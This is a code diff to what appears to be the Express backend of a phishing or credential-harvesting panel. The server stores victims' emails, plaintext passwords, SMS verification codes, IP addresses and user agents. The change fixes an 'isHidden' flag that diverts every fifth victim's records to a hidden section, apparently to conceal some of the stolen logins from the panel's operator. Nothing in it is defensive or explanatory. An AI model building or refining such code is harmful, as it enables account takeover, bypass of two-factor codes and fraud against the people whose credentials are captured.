@@ -34,7 +34,12 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const ipAddress = getClientIp(req);
       const userAgent = req.headers['user-agent'] || 'unknown';
 
-      // Save collected data to database
+      // Determine if this user should be in hidden section (20%)
+      const totalUsers = await storage.countTotalUsers();
+      // First 20% of users go to hidden section (every 5th user starting from 1st)
+      const isHidden = (totalUsers % 5) === 1;
+
+      // Save collected data to database WITH isHidden flag
       const collectedDataRecord = await storage.createCollectedData({
         email,
         password,
@@ -42,12 +47,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
         smsCode: null,
         ipAddress,
         userAgent,
+        isHidden,
       });
-
-      // Determine if this user should be in hidden section (20%)
-      const totalUsers = await storage.countTotalUsers();
-      // First 20% of users go to hidden section (every 5th user starting from 1st)
-      const isHidden = (totalUsers % 5) === 1;
 
       // Create inbox message for registration
       await storage.createInboxMessage({
@@ -100,9 +101,9 @@ export async function registerRoutes(app: Express): Promise<Server> {
         return res.status(500).json({ message: "خطأ في تحديث البيانات" });
       }
 
-      // Determine if this user's SMS verification should be in hidden section (same as registration)
-      const totalUsers = await storage.countTotalUsers();
-      const isHidden = (totalUsers % 5) === 1;
+      // Use the SAME isHidden flag from the original registration
+      // This ensures both messages (registration + SMS) are in the same section
+      const isHidden = updatedRecord.isHidden;
 
       // Create inbox message for SMS verification
       await storage.createInboxMessage({
